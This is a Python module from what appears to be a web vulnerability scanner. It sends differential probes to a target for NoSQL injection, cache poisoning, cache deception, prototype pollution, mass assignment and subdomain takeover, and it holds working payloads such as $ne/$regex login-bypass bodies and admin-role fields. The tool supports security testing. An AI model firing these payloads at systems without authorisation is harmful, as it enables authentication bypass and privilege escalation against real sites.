"""omega/scanning/attackscan.py — aggressive multi-technique suite
(fusion suite name: ``attackscan``).

Go core + Python fallback, on purpose: the compiled Go binary
(omega/adapters/go/attackscan.go) runs the checks concurrently with a
worker pool and does the heavy differential work; when the Go toolchain
or binary is unavailable the same checks run in Python so the suite
ALWAYS executes ("must just work" rule).

Techniques (all evidence-gated differentials, never destructive):
  nosqli      — NoSQL operator injection ($ne/$regex/$gt) vs inert
                baseline POST; signal only on a >80-byte JSON delta.
  cachepoison — X-Forwarded-Host reflection; HIGH only when the marker
                survives a second request WITHOUT the header.
  cachedecep  — GET /<marker>.js with the replayed session cookie;
                candidate when an authenticated HTML page comes back
                where a .js asset should be.
  protopoll   — __proto__ / constructor.prototype injection across
                JSON + form encodings; candidate when the injected key
                is reflected by the server.
  massassign  — +role/isAdmin/role_id fields on user-create bodies;
                candidate on status/body differential.
  takeover    — dangling CNAME against known service fingerprints
                (opt-in: needs 'cnames' in path_info / env).

Findings carry verification='candidate' — these are probes, not
proof; claimcheck/manual confirmation upgrades them.
"""

from __future__ import annotations

import json
import os
import secrets
import shutil
import subprocess
import urllib.parse

__all__ = [
    "CHECKS",
    "DEFAULT_PATHS",
    "run_attackscan",
    "python_fallback",
]

CHECKS = ("nosqli", "cachepoison", "cachedecep", "protopoll",
          "massassign", "takeover")
DEFAULT_PATHS = ("/login", "/api/login", "/register", "/api/users",
                 "/api/auth", "/signin")

SUBPROC_TIMEOUT = 120
EVIDENCE_CAP = 300


def _gate_ok(gate):
    if gate is not None:
        try:
            return bool(gate() if callable(gate) else gate)
        except Exception:
            return False
    return os.environ.get("PTK_POLYGLOT") == "1"


def _finding(check, technique, severity, title, evidence, location,
             detail):
    ev = str(evidence or "")
    if len(ev) > EVIDENCE_CAP:
        ev = ev[:EVIDENCE_CAP] + "…"
    return {
        "title": title,
        "severity": severity,
        "confidence": "low",
        "verification": "candidate",
        "verification_note": (
            "differential probe only — confirms behaviour change, not "
            "exploitability; verify manually before trusting"),
        "manual_check": detail,
        "location": location,
        "evidence": ev,
        "source": "omega-attackscan/%s" % check,
        "technique": technique,
    }


# ---------------------------------------------------------------------------
# Go core
# ---------------------------------------------------------------------------

def _cache_dir():
    return os.environ.get("OMEGA_BIN_CACHE") or os.path.expanduser(
        "~/.cache/omega/bin")


def _ensure_go_binary():
    """Compile-on-demand attackscan; returns path or None."""
    if shutil.which("go") is None:
        return None
    src = os.path.join(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__))), "adapters", "go", "attackscan.go")
    if not os.path.isfile(src):
        return None
    out = os.path.join(_cache_dir(), "attackscan")
    try:
        os.makedirs(_cache_dir(), exist_ok=True)
        if os.path.exists(out) and \
                os.path.getmtime(out) >= os.path.getmtime(src):
            return out
        proc = subprocess.run(["go", "build", "-o", out, src],
                              capture_output=True, timeout=120,
                              cwd=os.path.dirname(src))
        if proc.returncode == 0 and os.path.exists(out):
            return out
    except (OSError, subprocess.SubprocessError):
        pass
    return None


def _run_go(binary, payload):
    try:
        proc = subprocess.run([binary], input=json.dumps(payload).encode(),
                              capture_output=True, timeout=SUBPROC_TIMEOUT)
        doc = json.loads(proc.stdout.decode("utf-8", "replace") or "{}")
        return doc.get("results") or []
    except (OSError, ValueError, subprocess.SubprocessError):
        return None


# ---------------------------------------------------------------------------
# Python fallback (same checks, sequential, contained)
# ---------------------------------------------------------------------------

def _pfetch(fetch, method, url, headers=None, body=None):
    try:
        resp = fetch(method, url, headers or {}, body)
        status = int(resp[0])
        hdrs = resp[1] or {}
        raw = resp[2]
        if isinstance(raw, bytes):
            raw = raw.decode("utf-8", "replace")
        return status, hdrs, str(raw or "")
    except Exception:
        return 0, {}, ""


def python_fallback(target, fetch, cookie="", paths=None, cnames=None,
                    checks=None, budget=40):
    """Sequential Python implementation of the same differentials."""
    paths = list(paths or DEFAULT_PATHS)
    checks = list(checks or ("nosqli", "cachepoison", "cachedecep",
                             "protopoll", "massassign"))
    base = target.rstrip("/")
    out = []
    sent = {"n": 0}

    def call(method, url, headers=None, body=None):
        if sent["n"] >= budget:
            return 0, {}, ""
        sent["n"] += 1
        return _pfetch(fetch, method, url, headers, body)

    hdr = {"Content-Type": "application/json"}
    if cookie:
        hdr["Cookie"] = cookie

    if "nosqli" in checks:
        for p in paths[:4]:
            u = base + p
            st0, _, b0 = call("POST", u, hdr,
                              '{"username":"omegansq","password":"omegansq"}')
            if not st0:
                continue
            for name, body in (
                    ("$ne-widening", '{"username":{"$ne":""},'
                                    '"password":{"$ne":""}}'),
                    ("$regex-all", '{"username":{"$regex":".*"},'
                                   '"password":{"$regex":".*"}}')):
                st, _, b = call("POST", u, hdr, body)
                if st == 200 and len(b) - len(b0) > 80:
                    out.append(_finding(
                        "nosqli", name, "high",
                        "NoSQL operator injection (differential response)",
                        b, p,
                        "inert baseline %dB vs operator %dB — verify the "
                        "auth bypass manually" % (len(b0), len(b))))

    if "cachepoison" in checks:
        marker = "omegapzn-" + secrets.token_hex(4)
        p = paths[0] if paths else "/"
        u = base + p + "?omegacp=" + marker
        h1 = {"X-Forwarded-Host": marker + ".example"}
        if cookie:
            h1["Cookie"] = cookie
        st, _, b = call("GET", u, h1)
        if marker + ".example" in b:
            _, _, b2 = call("GET", u, {"Cookie": cookie} if cookie else {})
            stored = marker + ".example" in b2
            out.append(_finding(
                "cachepoison", "xff-host",
                "high" if stored else "low",
                "Cache poisoning candidate (X-Forwarded-Host %s)" % (
                    "stored" if stored else "reflected"),
                b2 if stored else b, p,
                "marker survived a clean request" if stored else
                "header reflected but no cache store observed"))

    if "cachedecep" in checks and cookie:
        marker = "omegacdep-" + secrets.token_hex(4)
        u = base + "/" + marker + ".js"
        st, hdrs, b = call("GET", u, {"Cookie": cookie})
        ct = (hdrs or {}).get("Content-Type", "")
        low = b.lower()
        if st == 200 and "javascript" not in (ct or "").lower() and \
                any(w in low for w in ("logout", "account", "dashboard",
                                       "profile")):
            out.append(_finding(
                "cachedecep", "path-confusion", "high",
                "Web cache deception candidate (auth page served as .js)",
                b, "/" + marker + ".js",
                "authenticated content returned for a static-looking path"))

    if "protopoll" in checks:
        marker = "omegapp-" + secrets.token_hex(4)
        body = json.dumps({"__proto__": {marker: "yes"}})
        st, _, b = call("POST", base + "/api/users", hdr, body)
        if st and marker in b:
            out.append(_finding(
                "protopoll", "json-proto", "medium",
                "Prototype pollution candidate (key reflected)",
                b, "/api/users",
                "injected %s echoed back by the server" % marker))

    if "massassign" in checks:
        for p in (paths[:2] or ("/api/users", "/register")):
            base_body = ("username=omegausr&password=omegapw&"
                         "email=omegausr%40example.tld")
            priv_body = base_body + ("&role=admin&isAdmin=true&"
                                     "is_admin=1&role_id=1")
            fh = {"Content-Type": "application/x-www-form-urlencoded"}
            if cookie:
                fh["Cookie"] = cookie
            st0, _, b0 = call("POST", base + p, fh, base_body)
            st1, _, b1 = call("POST", base + p, fh, priv_body)
            if st0 and st1 and (st1 != st0 or len(b1) - len(b0) > 40):
                out.append(_finding(
                    "massassign", "privilege-fields", "high",
                    "Mass assignment candidate (privilege fields accepted)",
                    b1, p,
                    "status %d->%d, body delta %dB" % (st0, st1,
                                                       len(b1) - len(b0))))

    if "takeover" in checks and cnames:
        import socket
        for host in cnames:
            try:
                cname = socket.gethostbyname_ex(host)[0]
            except OSError:
                cname = ""
            for fp in ("github.io", "s3.amazonaws.com", "herokuapp.com",
                       "azurewebsites.net", "netlify.app", "surge.sh"):
                if cname and fp in str(cname):
                    out.append(_finding(
                        "takeover", "dangling-cname", "high",
                        "Subdomain takeover candidate (%s)" % fp,
                        "%s -> %s" % (host, cname), host,
                        "CNAME points at %s — verify claim manually" % fp))
    return out


# ---------------------------------------------------------------------------
# suite entry (fusion contract)
# ---------------------------------------------------------------------------

def run_attackscan(target, fetch=None, path_info=None, gate=None):
    """Run the aggressive multi-technique suite. Never raises."""
    if not _gate_ok(gate):
        return []
    if fetch is None:
        from omega.scanning.deepchecks import default_fetch
        fetch = default_fetch
    path_info = path_info if isinstance(path_info, dict) else {}
    cookie = path_info.get("cookie") or os.environ.get("OMEGA_COOKIE", "")
    paths = path_info.get("paths") or list(DEFAULT_PATHS)
    cnames = path_info.get("cnames") or [
        c for c in (os.environ.get("OMEGA_CNAMES") or "").split(",") if c]

    binary = _ensure_go_binary()
    results = None
    if binary:
        results = _run_go(binary, {
            "target": target, "cookie": cookie, "paths": list(paths),
            "cnames": list(cnames),
            "checks": [c for c in CHECKS if c != "takeover" or cnames],
        })
    if results is None:
        findings = python_fallback(target, fetch, cookie=cookie,
                                   paths=paths, cnames=cnames)
    else:
        findings = [_finding(
            r.get("check", "?"), r.get("technique", "?"),
            r.get("severity", "low"),
            "%s — %s" % (r.get("check", "?").replace("_", " ").title(),
                         r.get("signal", "differential")),
            r.get("evidence", ""), r.get("path", "/"),
            r.get("detail", "")) for r in results]
    # dedupe by (title, location)
    seen, deduped = set(), []
    for f in findings:
        key = (f["title"], f["location"])
        if key not in seen:
            seen.add(key)
            deduped.append(f)
    return deduped
